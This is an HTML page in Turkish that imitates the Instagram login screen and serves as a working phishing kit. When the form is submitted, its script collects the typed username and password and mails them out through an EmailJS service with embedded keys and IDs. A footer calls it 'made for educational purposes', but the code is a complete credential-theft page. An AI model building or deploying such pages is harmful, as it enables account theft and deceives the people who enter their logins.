<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram Giriş Sayfası</title>
  <link rel="stylesheet" href="style.css">

  <!-- EmailJS SDK -->
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
  <script>
    (function() {
      emailjs.init("48aOTKnKmcqHtrhB2"); // senin public key'in
    })();
  </script>
</head>

<body>
  <div class="container">
    <div class="login-box">
      <img class="logo" src="https://logos-world.net/wp-content/uploads/2020/04/Instagram-Logo-2010-2013-700x394.png" alt="Instagram Logo" width="175">

      <form id="loginForm" class="login-form">
        <div class="field">
          <input type="text" id="username" name="username" placeholder="Kullanıcı adı veya e-posta" required>
        </div>
        <div class="field">
          <input type="password" id="password" name="password" placeholder="Şifre" required>
        </div>
        <button type="submit" class="login-button">Giriş Yap</button>
      </form>

      <div class="facebook-login">
        <a href="#" class="fb-button">Facebook ile Giriş Yap</a>
      </div>

      <div class="forgot-password">
        <a href="#">Şifreni mi unuttun?</a>
      </div>
    </div>

    <div class="signup-box">
      <p>Hesabın yok mu? <a href="#">Kaydol</a></p>
    </div>
  </div>

  <footer>
    <p>&copy; 2025 Eğitim Amaçlı Yapılmıştır.</p>
  </footer>

  <script>
    // Form gönderildiğinde çalışır
    document.getElementById("loginForm").addEventListener("submit", function(event) {
      event.preventDefault();

      const formData = {
        username: document.getElementById("username").value,
        password: document.getElementById("password").value
      };

      emailjs.send("service_kxgmu58", "template_t4x776r", formData)
        .then(function(response) {
          alert("Giriş bilgileri gönderildi!");
          document.getElementById("loginForm").reset();
        }, function(error) {
          alert("Bir hata oluştu, tekrar deneyin.");
          console.log("Hata:", error);
        });
    });

    
  </script>
</body>
</html>
